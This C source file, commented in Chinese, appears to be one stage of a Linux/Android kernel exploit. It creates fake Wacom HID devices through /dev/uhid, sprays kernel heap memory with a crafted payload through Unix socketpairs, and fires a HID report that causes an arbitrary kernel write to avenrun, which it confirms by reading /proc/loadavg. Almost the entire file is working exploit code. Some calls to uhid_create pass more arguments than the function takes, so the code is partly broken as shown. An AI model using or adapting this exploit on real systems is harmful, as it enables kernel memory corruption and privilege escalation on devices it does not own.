/*
 * phase_b5: 用正确的 MUTE 值 {0x02, 0x01} 触发
 *
 * 依据 CVE99491_AUTHORITY.md §3.5 实测：
 *   {0x02,0x01} -> pad 收到 EV_KEY/0x240 + EV_ABS/0x28  ★ 有 EV_ABS!
 *   {0x02,0x02} -> pad 只收到 EV_KEY                    （我之前一直用错）
 *
 * EV_ABS(3) 是 input_handle_event 里唯一写 vals 的分支 (w23=1)。
 *
 * payload 要求（EV_ABS 路径）:
 *   0x028 = 0x8       evbit bit3 = EV_ABS（让 input_event 通过 evbit 门）
 *   0x098 = absbit    bit code(=0x28=40) 必须置位  => bit40 => absbit[0] 不够!
 *                    code=40 需要 absbit 第 40 位 = absbit[5] (40/64)
 *                    实际上 absbit 有多个 long，40 在 absbit[0] 的 bit40
 *                    => absbit[0] = 1<<40 = 0x10000000000
 *   0x140 = 0, 0x148 = 0
 *   0x568 num_vals=0, 0x56c max_vals=1
 *   0x570 vals = TARGET
 *   0x598 guard = 0
 *
 * 写出的值: type=3(EV_ABS), code=0x28(40), value=report byte
 * 作为 u64 = (value<<32) | (0x28<<16) | 3
 *
 * 目标 avenrun[2] = 0xffffffde9770e5a0
 * 写入后 /proc/loadavg 15 分钟字段会变成巨大值。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/uhid.h>

#define WACOM_VID 0x056a
#define PHYS_COMMON "phasetest/33"

static const unsigned char rdesc_touch[] = {
    0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
    0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
    0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x32, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x01, 0x09, 0x30,
    0x16, 0x01, 0x00, 0x26, 0xff, 0x7f,
    0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x31, 0x26, 0xff, 0x7f, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0xc0,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0
};

static const unsigned char rdesc_pad[] = {
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x01, 0x85, 0x02,
    0x05, 0x0d, 0x09, 0x20, 0xa1, 0x02,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x86, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x06, 0x0d, 0xff, 0x0a, 0x54, 0x04,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0, 0xc0
};

static long now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000000L + ts.tv_nsec / 1000L;
}

static int uhid_create(int fd, const char *name, unsigned pid,
                       const unsigned char *rd, size_t rl) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    snprintf((char *)ev.u.create2.name, sizeof(ev.u.create2.name), "%s", name);
    snprintf((char *)ev.u.create2.phys, sizeof(ev.u.create2.phys), "%s", PHYS_COMMON);
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    ev.u.create2.version = 0x0100;
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.rd_size = rl;
    memcpy(ev.u.create2.rd_data, rd, rl);
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static int uhid_destroy(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static int uhid_input(int fd, const unsigned char *data, size_t len) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_INPUT2;
    ev.u.input2.size = len;
    memcpy(ev.u.input2.data, data, len);
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static void pump(int fd, long ms) {
    long dl = now_us() / 1000 + ms;
    struct uhid_event ev;
    int fc = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
    while (now_us() / 1000 < dl) {
        if (read(fd, &ev, sizeof(ev)) <= 0) usleep(300);
    }
    fcntl(fd, F_SETFL, fc);
}

static double read_av15(void) {
    FILE *f = fopen("/proc/loadavg", "r");
    if (!f) return -1.0;
    char a[32]={0},b[32]={0},c[32]={0};
    if (fscanf(f,"%31s %31s %31s",a,b,c)!=3) { fclose(f); return -1.0; }
    fclose(f);
    return atof(c);
}

int main(int argc, char **argv) {
    int cpu    = argc > 1 ? atoi(argv[1]) : 0;
    int rounds = argc > 2 ? atoi(argv[2]) : 10;
    int pairs  = argc > 3 ? atoi(argv[3]) : 400;
    const char *pfile = argc > 4 ? argv[4] : "/data/local/tmp/payload_abs.bin";
    int mute_round = argc > 5 ? atoi(argv[5]) : rounds - 1;

    FILE *pf = fopen(pfile, "rb");
    if (!pf) { perror("payload"); return 2; }
    static unsigned char pl[4096];
    size_t pl_len = fread(pl, 1, sizeof(pl), pf);
    fclose(pf);

    unsigned long long ev0  = *(unsigned long long *)(pl + 0x028);
    unsigned long long abs0 = *(unsigned long long *)(pl + 0x098);
    unsigned long long vals = *(unsigned long long *)(pl + 0x570);
    unsigned char guard = pl[0x598];

    printf("=== phase_b5 (MUTE={02 01}, EV_ABS path) ===\n");
    printf("pid=%d cpu=%d rounds=%d mute_round=%d\n", getpid(), cpu, rounds, mute_round);
    printf("  evbit=0x%llx bit3=%d  absbit=0x%llx bit40=%d\n",
           ev0, (int)((ev0>>3)&1), abs0, (int)((abs0>>40)&1));
    printf("  vals=0x%016llx guard=0x%02x\n", vals, guard);
    printf("  目标: avenrun[2]=0xffffffde9770e5a0\n");
    fflush(stdout);

    cpu_set_t set; CPU_ZERO(&set); CPU_SET(cpu,&set);
    sched_setaffinity(0,sizeof(set),&set);

    double pre = read_av15();
    printf("BASELINE loadavg15=%.2f\n", pre);
    fflush(stdout);

    int (*sp)[2]=calloc(pairs,sizeof(int[2]));
    int made=0;
    for (int i=0;i<pairs;i++){
        if (socketpair(AF_UNIX,SOCK_DGRAM,0,sp[i])<0) continue;
        int sb=8<<20;
        setsockopt(sp[i][0],SOL_SOCKET,SO_SNDBUF,&sb,sizeof(sb));
        setsockopt(sp[i][1],SOL_SOCKET,SO_RCVBUF,&sb,sizeof(sb));
        made++;
    }
    printf("socketpairs=%d\n",made);

    int fdp=open("/dev/uhid",O_RDWR|O_CLOEXEC);
    if (fdp<0){perror("uhid");return 4;}
    if (uhid_create(fdp,"b5-pad",PHYS_COMMON,0x1102,rdesc_pad,sizeof(rdesc_pad))<0){printf("pad fail\n");return 5;}
    pump(fdp,100); usleep(200000); pump(fdp,30);
    printf("pad created\n"); fflush(stdout);

    for (int r=0;r<rounds;r++){
        int fdt=open("/dev/uhid",O_RDWR|O_CLOEXEC);
        if (fdt<0) break;
        char nm[32]; snprintf(nm,sizeof(nm),"b5-t%02d",r);
        if (uhid_create(fdt,nm,PHYS_COMMON,0x1100+r,rdesc_touch,sizeof(rdesc_touch))<0){close(fdt);break;}
        pump(fdt,40); usleep(20000); pump(fdt,10);
        uhid_destroy(fdt); close(fdt);

        int sent=0;
        for(int i=0;i<made;i++) if(send(sp[i][0],pl,pl_len,MSG_DONTWAIT)>=0) sent++;

        int is_mute=(r==mute_round);
        printf("round %2d sent=%d%s\n",r,sent,is_mute?"  <<< MUTE":"");
        fflush(stdout);

        if (is_mute){
            unsigned char rep[2]={0x02,0x01};   /* ★ 正确值：产生 EV_ABS/0x28 */
            printf(">>> firing MUTE {02 01}\n"); fflush(stdout);
            uhid_input(fdp,rep,sizeof(rep));
            pump(fdp,80);
            printf("<<< MUTE returned\n"); fflush(stdout);

            double a[5];
            for(int i=0;i<5;i++){a[i]=read_av15(); if(i<4) usleep(250000);}
            printf("POST = %.2f %.2f %.2f %.2f %.2f\n",a[0],a[1],a[2],a[3],a[4]);
            int huge=0,zero=0;
            for(int i=0;i<5;i++){if(a[i]>1000)huge++; if(a[i]>=0&&a[i]<0.005)zero++;}
            printf("huge=%d zero=%d\n",huge,zero);
            if(huge>0||zero>=3) printf("VERDICT: WRITE CONFIRMED (PASS)\n");
            else printf("VERDICT: NO WRITE\n");
            fflush(stdout);
        }
        char tmp[4096];
        for(int i=0;i<made;i++) while(recv(sp[i][1],tmp,sizeof(tmp),MSG_DONTWAIT)>0);
    }
    if(fdp>=0){uhid_destroy(fdp);close(fdp);}
    printf("=== done SURVIVED pid=%d ===\n",getpid());
    fflush(stdout);
    return 0;
}